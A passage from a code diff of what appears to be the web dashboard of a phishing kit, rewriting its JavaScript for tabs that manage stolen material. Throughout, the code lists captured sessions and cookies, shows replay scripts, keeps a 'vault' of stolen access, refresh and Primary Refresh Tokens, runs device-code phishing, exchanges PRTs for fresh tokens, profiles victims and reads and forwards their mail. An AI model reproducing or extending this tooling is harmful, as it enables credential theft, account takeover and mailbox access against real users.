-                    <td><span class="badge badge-info">${f.user_code}</span></td>
-                    <td style="font-size:12px;">${f.verification_uri}</td>
-                    <td><span class="badge ${statusClass}">${f.status}</span></td>
-                    <td style="font-size:12px;color:rgba(255,255,255,0.4);">${new Date(f.created).toLocaleString()}</td>
-                    <td style="font-size:12px;overflow:hidden;max-width:150px;">${f.access_token ? f.access_token.slice(0,30)+'...' : 'N/A'}</td>
-                    <td>
-                        ${f.access_token ? `<button class="action-btn" onclick="useDeviceToken('${f.session_id}')">▶ Use</button>` : ''}
-                        <button class="action-btn" onclick="navigator.clipboard.writeText('${f.device_code}')">📋 Copy</button>
-                    </td>
-                `;
-                tbody.appendChild(row);
-            });
-        } catch (e) { console.error('Device history load failed:', e); }
-    }
-
-    async function useDeviceToken(sessionId) {
-        try {
-            const data = await apiFetch('/device/use', {
-                method: 'POST',
-                body: JSON.stringify({ session_id: sessionId })
-            });
-            if (data.access_token) {
-                localStorage.setItem('evil_token', data.access_token);
-                showToast('✅ Token loaded. Use in Recon/Webmail tabs.');
-                document.getElementById('reconToken').value = data.access_token;
-                document.getElementById('webmailToken').value = data.access_token;
-            }
-        } catch (e) { showToast('Use token failed: '+e.message, true); }
-    }
-
-    // ============================================================
-    // PRT TAB
-    // ============================================================
-    async function scanPRT() {
-        showToast('🔍 Scanning for PRTs...');
-        try {
-            const data = await apiFetch('/prt/scan', { method: 'POST' });
-            if (data.success) {
-                showToast(`✅ Found ${data.count} PRTs.`);
-                loadPRTList();
-            }
-        } catch (e) { showToast('PRT scan failed: '+e.message, true); }
-    }
-
-    async function loadPRTList() {
-        try {
-            const data = await apiFetch('/prt/list');
-            prts = data.prts || [];
-            const stats = await apiFetch('/prt/stats');
-            document.getElementById('prtStats').textContent = `📊 ${stats.stats.total} PRTs · ${stats.stats.uniqueUsers} users`;
-            const tbody = document.getElementById('prtTable');
-            if (prts.length === 0) {
-                tbody.innerHTML = `<tr><td colspan="5" style="text-align:center; color:rgba(255,255,255,0.3); padding:20px;">No PRTs found.</td></tr>`;
-                return;
-            }
-            tbody.innerHTML = '';
-            prts.slice().reverse().forEach(p => {
-                const row = document.createElement('tr');
-                row.innerHTML = `
-                    <td>${p.username || 'unknown'}</td>
-                    <td style="font-size:12px;font-family:monospace;">${p.prt ? p.prt.slice(0,30)+'...' : 'N/A'}</td>
-                    <td style="font-size:12px;color:rgba(255,255,255,0.4);">${new Date(p.timestamp).toLocaleString()}</td>
-                    <td style="font-size:12px;color:rgba(255,255,255,0.4);">${p.source || 'N/A'}</td>
-                    <td>
-                        <button class="action-btn token" onclick="exchangePRT('${p.prt}')">🔄 Exchange</button>
-                        <button class="action-btn" onclick="healthCheckPRT('${p.prt}')">🩺 Health</button>
-                        <button class="action-btn" onclick="navigator.clipboard.writeText('${p.prt}')">📋 Copy</button>
-                    </td>
-                `;
-                tbody.appendChild(row);
-            });
-        } catch (e) { console.error('PRT list load failed:', e); }
-    }
-
-    async function healthCheckPRT(prt) {
-        try {
-            const data = await apiFetch('/prt/health', {
-                method: 'POST',
-                body: JSON.stringify({ prt })
-            });
-            if (data.valid) showToast('✅ PRT is valid.');
-            else showToast('❌ PRT is invalid: ' + (data.error || ''), true);
-        } catch (e) { showToast('Health check failed: '+e.message, true); }
-    }
-
-    async function exchangePRT(prt) {
-        if (!confirm('Exchange this PRT for fresh tokens?')) return;
-        try {
-            const data = await apiFetch('/prt/exchange', {
-                method: 'POST',
-                body: JSON.stringify({ prt })
-            });
-            if (data.success) {
-                showToast('✅ Exchange successful!');
-                localStorage.setItem('evil_token', JSON.stringify(data.data));
-                window.open(`https://developer.microsoft.com/en-us/graph/graph-explorer?token=${data.data.access_token}`, '_blank');
-            }
-        } catch (e) { showToast('Exchange failed: '+e.message, true); }
-    }
-
-    async function healthCheckPRTAll() {
-        showToast('🩺 Checking all PRTs...');
-        try {
-            const data = await apiFetch('/prt/health-all', { method: 'POST' });
-            if (data.success) {
-                const valid = data.results.filter(r => r.valid).length;
-                showToast(`✅ ${valid} valid, ${data.results.length - valid} invalid.`);
-                loadPRTList();
-            }
-        } catch (e) { showToast('Health all failed: '+e.message, true); }
-    }
-
-    async function exchangePRTAll() {
-        if (!confirm('Exchange all PRTs for fresh tokens?')) return;
-        showToast('🔄 Exchanging all PRTs...');
-        try {
-            const data = await apiFetch('/prt/exchange-all', { method: 'POST' });
-            if (data.success) {
-                const success = data.results.filter(r => r.success).length;
-                showToast(`✅ ${success} of ${data.results.length} exchanged.`);
-                loadPRTList();
-            }
-        } catch (e) { showToast('Exchange all failed: '+e.message, true); }
-    }
-
-    // ============================================================
-    // RECON TAB
-    // ============================================================
-    async function doRecon() {
-        const token = document.getElementById('reconToken').value.trim();
-        if (!token) { showToast('Enter an access token.', true); return; }
-        showToast('🔍 Running recon...');
-        try {
-            const data = await apiFetch('/recon', {
-                method: 'POST',
-                body: JSON.stringify({ accessToken: token })
-            });
-            if (data.success) {
-                const profile = data.profile;
-                const html = `
-                    <h4>👤 User Profile</h4>
-                    <pre>${JSON.stringify(profile, null, 2)}</pre>
-                `;
-                document.getElementById('reconResult').innerHTML = html;
-                showToast('✅ Recon complete.');
-            }
-        } catch (e) { showToast('Recon failed: '+e.message, true); }
-    }
-
-    async function loadReconFromVault() {
-        const tokens = await apiFetch('/vault/tokens');
-        const accessToken = tokens.tokens?.find(t => t.type === 'access')?.value;
-        if (accessToken) {
-            document.getElementById('reconToken').value = accessToken;
-            showToast('✅ Loaded access token from vault.');
-            doRecon();
-        } else {
-            showToast('No access token in vault.', true);
         }
-    }
 
-    // ============================================================
-    // WEBMAIL TAB
-    // ============================================================
-    async function loadWebmail() {
-        const token = document.getElementById('webmailToken').value.trim();
-        const folder = document.getElementById('webmailFolder').value;
-        const limit = parseInt(document.getElementById('webmailLimit').value) || 20;
-        if (!token) { showToast('Enter an access token.', true); return; }
-        showToast('📧 Loading emails...');
-        try {
-            const data = await apiFetch('/webmail/emails', {
-                method: 'POST',
-                body: JSON.stringify({ accessToken: token, folderId: folder, limit, skip: 0 })
-            });
-            if (data.success) {
-                const emails = data.emails || [];
-                const tbody = document.getElementById('webmailTable');
-                if (emails.length === 0) {
-                    tbody.innerHTML = `<tr><td colspan="4" style="text-align:center; color:rgba(255,255,255,0.3); padding:20px;">No emails found.</td></tr>`;
+        async function loadRecentSessions() {
+            try {
+                const logs = await api('/logs');
+                const container = document.getElementById('recentSessions');
+                if (!logs || logs.length === 0) {
+                    container.innerHTML = '<p style="color:var(--muted)">No sessions yet.</p>';
                     return;
                 }
-                tbody.innerHTML = '';
-                emails.forEach(e => {
-                    const row = document.createElement('tr');
-                    const from = e.sender?.emailAddress?.address || e.from?.emailAddress?.address || 'Unknown';
-                    const received = new Date(e.receivedDateTime).toLocaleString();
-                    row.innerHTML = `
-                        <td><strong>${e.subject || '(no subject)'}</strong></td>
-                        <td style="font-size:13px;">${from}</td>
-                        <td style="font-size:12px;color:rgba(255,255,255,0.4);">${received}</td>
-                        <td>
-                            <button class="action-btn" onclick="viewEmail('${e.id}')">👁️ View</button>
-                            <button class="action-btn" onclick="forwardEmail('${e.id}')">↗️ Forward</button>
-                        </td>
-                    `;
-                    tbody.appendChild(row);
-                });
-                showToast(`📧 Loaded ${emails.length} emails.`);
-            }
-        } catch (e) { showToast('Webmail load failed: '+e.message, true); }
-    }
-
-    async function loadWebmailFromVault() {
-        const tokens = await apiFetch('/vault/tokens');
-        const accessToken = tokens.tokens?.find(t => t.type === 'access')?.value;
-        if (accessToken) {
-            document.getElementById('webmailToken').value = accessToken;
-            showToast('✅ Loaded access token from vault.');
-            loadWebmail();
-        } else {
-            showToast('No access token in vault.', true);
+                container.innerHTML = logs.slice(0, 10).map(l => 
+                    `<div style="padding:8px 0;border-bottom:1px solid var(--border);font-size:13px">
+                        📄 ${l.name} — ${new Date(l.modified).toLocaleString()} — ${(l.size/1024).toFixed(1)} KB
+                        <button class="btn btn-sm" style="margin-left:10px" onclick="viewSession('${l.name}')">View</button>
+                    </div>`
+                ).join('');
+            } catch (e) { document.getElementById('recentSessions').innerHTML = '<p style="color:var(--red)">Failed to load.</p>'; }
         }
-    }
 
-    async function viewEmail(messageId) {
-        const token = document.getElementById('webmailToken').value.trim();
-        if (!token) { showToast('Enter an access token.', true); return; }
-        try {
-            const data = await apiFetch('/webmail/email', {
-                method: 'POST',
-                body: JSON.stringify({ accessToken: token, messageId })
-            });
-            if (data.success) {
-                const email = data.email;
-                const html = `
-                    <h4>📧 ${email.subject || '(no subject)'}</h4>
-                    <p><strong>From:</strong> ${email.sender?.emailAddress?.address || 'Unknown'}</p>
-                    <p><strong>To:</strong> ${email.toRecipients?.map(r => r.emailAddress.address).join(', ') || 'Unknown'}</p>
-                    <p><strong>Received:</strong> ${new Date(email.receivedDateTime).toLocaleString()}</p>
-                    <hr>
-                    <div>${email.body?.content || 'No body'}</div>
+        async function loadAllSessions() {
+            try {
+                const logs = await api('/logs');
+                const container = document.getElementById('allSessions');
+                if (!logs || logs.length === 0) {
+                    container.innerHTML = '<p style="color:var(--muted)">No sessions yet.</p>';
+                    return;
+                }
+                container.innerHTML = `<table><thead><tr><th>File</th><th>Size</th><th>Modified</th><th>Actions</th></tr></thead><tbody>` +
+                    logs.map(l => `<tr>
+                        <td>📄 ${l.name}</td>
+                        <td>${(l.size/1024).toFixed(1)} KB</td>
+                        <td>${new Date(l.modified).toLocaleString()}</td>
+                        <td>
+                            <button class="btn btn-sm" onclick="viewSession('${l.name}')">View</button>
+                            <button class="btn btn-sm" onclick="viewTokens('${l.name}')">Tokens</button>
+                            <button class="btn btn-sm" onclick="replaySession('${l.name}')">Replay</button>
+                        </td>
+                    </tr>`).join('') + '</tbody></table>';
+            } catch (e) { document.getElementById('allSessions').innerHTML = '<p style="color:var(--red)">Failed to load.</p>'; }
+        }
+
+        async function viewSession(filename) {
+            try {
+                const data = await api('/log/' + filename);
+                const container = document.getElementById('allSessions');
+                container.innerHTML = '<h4>📄 ' + filename + '</h4><textarea readonly>' + 
+                    JSON.stringify(data.entries, null, 2) + '</textarea>' +
+                    '<button class="btn" style="margin-top:8px" onclick="loadAllSessions()">← Back</button>';
+            } catch (e) { showToast('Failed to load session', true); }
+        }
+
+        async function viewTokens(filename) {
+            try {
+                const data = await api('/tokens/' + filename);
+                const container = document.getElementById('allSessions');
+                container.innerHTML = '<h4>🔑 Tokens from ' + filename + '</h4><textarea readonly>' + 
+                    JSON.stringify(data.tokens, null, 2) + '</textarea>' +
+                    '<button class="btn" style="margin-top:8px" onclick="loadAllSessions()">← Back</button>';
+            } catch (e) { showToast('Failed to load tokens', true); }
+        }
+
+        async function replaySession(filename) {
+            try {
+                const data = await api('/replay/' + filename);
+                const container = document.getElementById('allSessions');
+                container.innerHTML = '<h4>🎬 Replay: ' + filename + '</h4>' +
+                    '<p>Cookies: ' + data.cookieCount + ' | Domain: ' + data.targetDomain + '</p>' +
+                    '<textarea readonly style="height:200px">' + data.replayScript + '</textarea>' +
+                    '<button class="btn" style="margin-top:8px" onclick="loadAllSessions()">← Back</button>';
+            } catch (e) { showToast('Failed to load replay', true); }
+        }
+
+        // ============================================================
+        // 🏛️ TOKEN VAULT
+        // ============================================================
+        async function scanVault() {
+            try {
+                const res = await api('/vault/scan', { method: 'POST' });
+                showToast('Scanned: ' + res.count + ' tokens found');
+                await loadVaultStats();
+                await loadVaultTokens();
+            } catch (e) { showToast('Scan failed: ' + e.message, true); }
+        }
+
+        async function loadVaultStats() {
+            try {
+                const stats = await api('/vault/stats');
+                document.getElementById('vaultStats').innerHTML = `
+                    <div class="flex-row">
+                        <div class="stat-card"><div class="label">Total</div><div class="value accent">${stats.stats.total}</div></div>
+                        <div class="stat-card"><div class="label">Access</div><div class="value">${stats.stats.access}</div></div>
+                        <div class="stat-card"><div class="label">Refresh</div><div class="value orange">${stats.stats.refresh}</div></div>
+                        <div class="stat-card"><div class="label">PRT</div><div class="value green">${stats.stats.prt}</div></div>
+                    </div>`;
+            } catch (e) {}
+        }
+
+        async function loadVaultTokens() {
+            try {
+                const data = await api('/vault/tokens');
+                const tokens = data.tokens || [];
+                document.getElementById('vaultTokens').innerHTML = tokens.length === 0 ? 
+                    '<p style="color:var(--muted)">No tokens found. Click "Scan Logs".</p>' :
+                    `<table><thead><tr><th>Type</th><th>Username</th><th>Token</th></tr></thead><tbody>` +
+                    tokens.map(t => `<tr><td>🔑 ${t.type}</td><td>${t.username}</td><td style="font-family:monospace;font-size:11px">${t.value.slice(0,40)}...</td></tr>`).join('') +
+                    '</tbody></table>';
+            } catch (e) {}
+        }
+
+        async function healthCheckVault() {
+            try {
+                const res = await api('/vault/healthcheck', { method: 'POST' });
+                document.getElementById('vaultTokens').innerHTML = '<h4>💚 Health Check Results</h4>' +
+                    res.results.map(r => `<div style="padding:6px 0;border-bottom:1px solid var(--border)">${r.status === 'valid' ? '✅' : '❌'} ${r.username}: ${r.status} ${r.user || ''}</div>`).join('');
+            } catch (e) { showToast('Health check failed', true); }
+        }
+
+        // ============================================================
+        // 📈 ANALYTICS
+        // ============================================================
+        async function loadAnalytics() {
+            try {
+                const data = await api('/analytics');
+                const a = data.analytics;
+                document.getElementById('analyticsData').innerHTML = `
+                    <div class="stats-grid" style="margin-bottom:15px">
+                        <div class="stat-card"><div class="label">Total Visits</div><div class="value">${a.visits.total}</div><div class="sub">Today: ${a.visits.today}</div></div>
+                        <div class="stat-card"><div class="label">Total Captures</div><div class="value accent">${a.captures.total}</div><div class="sub">Today: ${a.captures.today}</div></div>
+                        <div class="stat-card"><div class="label">Conversion</div><div class="value orange">${a.conversionRate.total}%</div><div class="sub">Today: ${a.conversionRate.today}%</div></div>
+                        <div class="stat-card"><div class="label">Unique IPs</div><div class="value green">${a.uniqueIPs}</div></div>
+                    </div>
+                    <h4>🌐 Top Domains</h4>
+                    ${(a.topDomains || []).map(d => `<div style="padding:4px 0">🔗 ${d.domain}: ${d.count} visits</div>`).join('') || '<p style="color:var(--muted)">No data</p>'}
                 `;
-                openModal(`📄 ${email.subject || 'Email'}`, html);
+            } catch (e) { document.getElementById('analyticsData').innerHTML = '<p style="color:var(--red)">Failed to load.</p>'; }
+        }
+
+        // ============================================================
+        // 📱 DEVICE CODE
+        // ============================================================
+        async function requestDeviceCode() {
+            try {
+                const res = await api('/device/request', { method: 'POST' });
+                document.getElementById('deviceResult').innerHTML = `
+                    <div class="panel" style="border:2px solid var(--accent)">
+                        <h4>🔑 Device Code Generated!</h4>
+                        <p><strong>User Code:</strong> <span style="font-size:24px;font-weight:800;color:var(--accent)">${res.user_code}</span></p>
+                        <p><strong>Verification URL:</strong> ${res.verification_uri}</p>
+                        <p>Expires in: ${res.expires_in} seconds | Interval: ${res.interval}s</p>
+                        <button class="btn btn-primary" onclick="pollDeviceToken('${res.device_code}')">🔄 Poll for Token</button>
+                    </div>`;
+            } catch (e) { showToast('Device code request failed: ' + e.message, true); }
+        }
+
+        async function pollDeviceToken(deviceCode) {
+            try {
+                const res = await api('/device/token', { method: 'POST', body: { device_code: deviceCode } });
+                document.getElementById('deviceResult').innerHTML += `
+                    <div class="panel" style="border:2px solid var(--green)">
+                        <h4>✅ Token Received!</h4>
+                        <textarea readonly>${JSON.stringify(res, null, 2)}</textarea>
+                    </div>`;
+                showToast('Token received!');
+            } catch (e) {
+                if (e.message.includes('authorization_pending')) {
+                    showToast('Still waiting for user approval...');
+                    setTimeout(() => pollDeviceToken(deviceCode), 5000);
+                } else {
+                    showToast('Token poll failed: ' + e.message, true);
+                }
             }
-        } catch (e) { showToast('View email failed: '+e.message, true); }
-    }
+        }
 
-    async function forwardEmail(messageId) {
-        const token = document.getElementById('webmailToken').value.trim();
-        if (!token) { showToast('Enter an access token.', true); return; }
-        const to = prompt('Enter recipient email:');
-        if (!to) return;
-        const subject = prompt('Subject:');
-        const body = prompt('Body:');
-        try {
-            const data = await apiFetch('/webmail/send', {
-                method: 'POST',
-                body: JSON.stringify({
-                    accessToken: token,
-                    to: [to],
-                    subject: subject || 'Fwd: ...',
-                    body: body || 'Forwarded email.',
-                    forwardFromId: messageId
-                })
-            });
-            if (data.success) showToast('✅ Email forwarded.');
-        } catch (e) { showToast('Forward failed: '+e.message, true); }
-    }
+        async function loadDeviceHistory() {
+            try {
+                const res = await api('/device/history');
+                const flows = res.flows || [];
+                document.getElementById('deviceHistory').innerHTML = flows.length === 0 ?
+                    '<p style="color:var(--muted)">No device flows yet.</p>' :
+                    `<table><thead><tr><th>User Code</th><th>Status</th><th>Created</th><th>Actions</th></tr></thead><tbody>` +
+                    flows.map(f => `<tr>
+                        <td><code>${f.user_code}</code></td>
+                        <td><span class="badge ${f.status === 'approved' ? 'enabled' : 'disabled'}">${f.status}</span></td>
+                        <td>${new Date(f.created).toLocaleString()}</td>
+                        <td>${f.access_token ? `<button class="btn btn-sm" onclick="useDeviceToken('${f.session_id}')">Use</button>` : '—'}</td>
+                    </tr>`).join('') + '</tbody></table>';
+            } catch (e) { document.getElementById('deviceHistory').innerHTML = '<p style="color:var(--red)">Failed to load.</p>'; }
+        }
 
-    // ============================================================
-    // INIT
-    // ============================================================
-    connectWebSocket();
-    refreshLogs();
-    setInterval(refreshLogs, 15000);
-    loadVault();
-    loadAnalytics();
-    loadPhishlets();
-    loadDeviceHistory();
-    loadPRTList();
-</script>
+        async function useDeviceToken(sessionId) {
+            try {
+                const res = await api('/device/use', { method: 'POST', body: { session_id: sessionId } });
+                document.getElementById('deviceResult').innerHTML = `
+                    <div class="panel" style="border:2px solid var(--green)">
+                        <h4>🔑 Token for Session ${sessionId}</h4>
+                        <textarea readonly>${JSON.stringify(res, null, 2)}</textarea>
+                    </div>`;
+            } catch (e) { showToast('Failed to get token', true); }
+        }
+
+        // ============================================================
+        // 🔐 PRT ENGINE
+        // ============================================================
+        async function scanPRTs() {
+            try {
+                const res = await api('/prt/scan', { method: 'POST' });
+                showToast('Found ' + res.count + ' PRTs');
+                loadPRTList();
+                loadPRTStats();
+            } catch (e) { showToast('PRT scan failed', true); }
+        }
+
+        async function loadPRTList() {
+            try {
+                const res = await api('/prt/list');
+                const prts = res.prts || [];
+                document.getElementById('prtList').innerHTML = prts.length === 0 ?
+                    '<p style="color:var(--muted)">No PRTs found. Click "Scan PRTs".</p>' :
+                    `<table><thead><tr><th>Username</th><th>PRT</th><th>Source</th><th>Actions</th></tr></thead><tbody>` +
+                    prts.map(p => `<tr>
+                        <td>${p.username}</td>
+                        <td style="font-family:monospace;font-size:11px">${p.prt.slice(0,40)}...</td>
+                        <td>${p.source}</td>
+                        <td>
+                            <button class="btn btn-sm" onclick="exchangePRT('${p.prt}')">Exchange</button>
+                            <button class="btn btn-sm" onclick="healthPRT('${p.prt}')">Health</button>
+                        </td>
+                    </tr>`).join('') + '</tbody></table>';
+            } catch (e) {}
+        }
+
+        async function loadPRTStats() {
+            try {
+                const res = await api('/prt/stats');
+                document.getElementById('prtStats').innerHTML = `
+                    <div class="flex-row">
+                        <div class="stat-card"><div class="label">Total PRTs</div><div class="value accent">${res.stats.total}</div></div>
+                        <div class="stat-card"><div class="label">Unique Users</div><div class="value">${res.stats.uniqueUsers}</div></div>
+                        <div class="stat-card"><div class="label">Last Scan</div><div class="value" style="font-size:14px">${res.stats.lastScan ? new Date(res.stats.lastScan).toLocaleString() : 'Never'}</div></div>
+                    </div>`;
+            } catch (e) {}
+        }
+
+        async function exchangePRT(prt) {
+            try {
+                const res = await api('/prt/exchange', { method: 'POST', body: { prt } });
+                document.getElementById('prtList').innerHTML += `
+                    <div class="panel" style="border:2px solid var(--green);margin-top:10px">
+                        <h4>✅ PRT Exchanged!</h4>
+                        <textarea readonly>${JSON.stringify(res.data, null, 2)}</textarea>
+                    </div>`;
+                showToast('PRT exchanged!');
+            } catch (e) { showToast('Exchange failed: ' + e.message, true); }
+        }
+
+        async function healthPRT(prt) {
+            try {
+                const res = await api('/prt/health', { method: 'POST', body: { prt } });
+                showToast('PRT Health: ' + (res.valid ? '✅ Valid' : '❌ Invalid'));
+            } catch (e) { showToast('Health check failed', true); }
+        }
+
+        async function healthAllPRTs() {
+            try {
+                const res = await api('/prt/health-all', { method: 'POST' });
+                document.getElementById('prtList').innerHTML = '<h4>💚 Health All Results</h4>' +
+                    res.results.map(r => `<div style="padding:6px 0;border-bottom:1px solid var(--border)">${r.valid ? '✅' : '❌'} ${r.username}: ${r.valid ? 'Valid' : r.error}</div>`).join('');
+            } catch (e) { showToast('Health all failed', true); }
+        }
+
+        async function exchangeAllPRTs() {
+            try {
+                const res = await api('/prt/exchange-all', { method: 'POST' });
+                document.getElementById('prtList').innerHTML = '<h4>🔄 Exchange All Results</h4>' +
+                    res.results.map(r => `<div style="padding:6px 0;border-bottom:1px solid var(--border)">${r.success ? '✅' : '❌'} ${r.username}: ${r.success ? 'Exchanged' : r.error}</div>`).join('');
+            } catch (e) { showToast('Exchange all failed', true); }
+        }
+
+        // ============================================================
+        // 🔍 RECON
+        // ============================================================
+        async function runRecon() {
+            const token = document.getElementById('reconToken').value.trim();
+            if (!token) { showToast('Paste an access token first', true); return; }
+            try {
+                const res = await api('/recon', { method: 'POST', body: { accessToken: token } });
+                document.getElementById('reconResult').innerHTML = `
+                    <div class="panel" style="border:2px solid var(--green);margin-top:10px">
+                        <h4>🔍 Recon Results</h4>
+                        <textarea readonly style="height:300px">${JSON.stringify(res.profile, null, 2)}</textarea>
+                    </div>`;
+            } catch (e) { showToast('Recon failed: ' + e.message, true); }
+        }
+
+        // ============================================================
+        // 📧 WEBMAIL
+        // ============================================================
+        async function loadFolders() {
+            const token = document.getElementById('webmailToken').value.trim();
+            if (!token) { showToast('Paste an access token first', true); return; }
+            try {
+                const res = await api('/webmail/folders', { method: 'POST', body: { accessToken: token } });
+                document.getElementById('webmailFolders').innerHTML = '<h4>📁 Folders</h4>' +
+                    res.folders.map(f => `<div style="padding:4px 0">📁 ${f.displayName} (${f.childFolderCount || 0} subfolders) — ${f.totalItemCount || 0} items</div>`).join('');
+            } catch (e) { showToast('Failed to load folders', true); }
+        }
+
+        async function loadEmails(folderId) {
+            const token = document.getElementById('webmailToken').value.trim();
+            if (!token) { showToast('Paste an access token first', true); return; }
+            try {
+                const res = await api('/webmail/emails', { method: 'POST', body: { accessToken: token, folderId } });
+                document.getElementById('webmailEmails').innerHTML = '<h4>📧 ' + folderId + ' (' + res.count + ' emails)</h4>' +
+                    (res.emails || []).map(e => `<div style="padding:6px 0;border-bottom:1px solid var(--border)">
+                        <strong>${e.subject || '(no subject)'}</strong> — ${e.sender?.emailAddress?.name || 'Unknown'} — ${new Date(e.receivedDateTime).toLocaleString()}
+                    </div>`).join('');
+            } catch (e) { showToast('Failed to load emails', true); }
+        }
+
+        // ============================================================
+        // 🚀 INIT
+        // ============================================================
+        refreshAll();
+        loadRecentSessions();
+        setInterval(refreshAll, 60000);
+    </script>
 </body>
 </html>
